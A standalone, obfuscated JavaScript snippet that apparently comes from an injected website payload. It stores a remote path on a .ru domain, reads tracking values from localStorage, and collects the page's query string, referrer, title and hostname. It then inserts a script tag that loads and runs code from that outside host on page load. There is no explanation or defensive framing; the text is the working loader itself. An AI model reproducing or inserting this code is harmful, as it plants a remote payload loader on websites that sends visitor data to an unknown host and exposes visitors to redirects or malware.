var name = '_1Yx7MwFdRbkWVzNV';
    if (!window._1Yx7MwFdRbkWVzNV) {
        window._1Yx7MwFdRbkWVzNV = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://restenx.ru/mp48Jj',
        };
    }
    const _mHWZ3NfWjCnz1XhW = localStorage.getItem('config');
    if (typeof _mHWZ3NfWjCnz1XhW !== 'undefined' && _mHWZ3NfWjCnz1XhW !== null) {
        var _pMY4FBdpf81jYxNN = JSON.parse(_mHWZ3NfWjCnz1XhW);
        var _PDYYhjtPVFGZsBgX = Math.round(+new Date()/1000);
        if (_pMY4FBdpf81jYxNN.created_at + window._1Yx7MwFdRbkWVzNV.ttl < _PDYYhjtPVFGZsBgX) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _xTXgd9wZWMDFtNnV = localStorage.getItem('subId');
    var _N78DWm5NYxN7pqpM = localStorage.getItem('token');
    var _4FfSfzySwkVrjSMn = '?return=js.client';
        _4FfSfzySwkVrjSMn += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _4FfSfzySwkVrjSMn += '&se_referrer=' + encodeURIComponent(document.referrer);
        _4FfSfzySwkVrjSMn += '&default_keyword=' + encodeURIComponent(document.title);
        _4FfSfzySwkVrjSMn += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _4FfSfzySwkVrjSMn += '&name=' + encodeURIComponent(name);
        _4FfSfzySwkVrjSMn += '&host=' + encodeURIComponent(window._1Yx7MwFdRbkWVzNV.R_PATH);
    if (typeof _xTXgd9wZWMDFtNnV !== 'undefined' && _xTXgd9wZWMDFtNnV && window._1Yx7MwFdRbkWVzNV.unique) {
        _4FfSfzySwkVrjSMn += '&sub_id=' + encodeURIComponent(_xTXgd9wZWMDFtNnV);
    }
    if (typeof _N78DWm5NYxN7pqpM !== 'undefined' && _N78DWm5NYxN7pqpM && window._1Yx7MwFdRbkWVzNV.unique) {
        _4FfSfzySwkVrjSMn += '&token=' + encodeURIComponent(_N78DWm5NYxN7pqpM);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._1Yx7MwFdRbkWVzNV.R_PATH + _4FfSfzySwkVrjSMn;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
